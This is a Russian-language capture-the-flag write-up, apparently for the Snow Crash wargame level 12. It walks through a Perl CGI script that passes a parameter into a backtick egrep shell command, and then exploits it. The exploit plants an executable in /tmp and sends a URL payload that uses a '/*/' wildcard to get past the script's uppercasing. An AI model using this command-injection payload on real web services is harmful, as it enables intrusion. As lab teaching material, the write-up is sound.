В домашней директории пользователя level11 находится perl скрипт level12.pl:

- Посмотрим что внутри:
`cat level12.pl`

Результат:
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; # превращаем любую строчную букву в прописную
  $xx =~ s/\s.*//; # удалить все после первого встреченного пробела
  @output = `egrep "^$xx" /tmp/xd 2>&1`; # выполнить команду в терминале
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));

Как и в level04, этот скрипт может быть вызван через запрос к серверу, и он использует два параметра «x» и «y» в своих функциях «t» и «n».
Из скрипта видно, что он работает обрабатывает текст в переменной x, отсюда можно сделать вывод, что мы будем в своих целях использовать только эту переменную

В строчке кода, где выполняется команда в терминале, мы можем вставить исполняемый файл, но так как используется утилита egrep, мы не увидим результат в терминале...
Тогда сделаем так, чтобы наш исполняемый файл выполнял команду getflag и сохранял вывод в файле:
`touch /tmp/FILE`
В /tmp/FILE записываем следующее:
#!/bin/sh
getflag > /tmp/flag12

Делаем его исполняемым:
chmod +x /tmp/FILE

Из-за того, что наш скрипт превращает строчные буквы в прописные, будем использовать подстановочный знак «*» вместо папки «tmp» в качестве пути к нашему файлу.

Заходим в браузер и вводим в адресную строку:
http://[адрес.виртуальной.машины]:4646/?x="`/*/FILE`"
`cat /tmp/flag12`
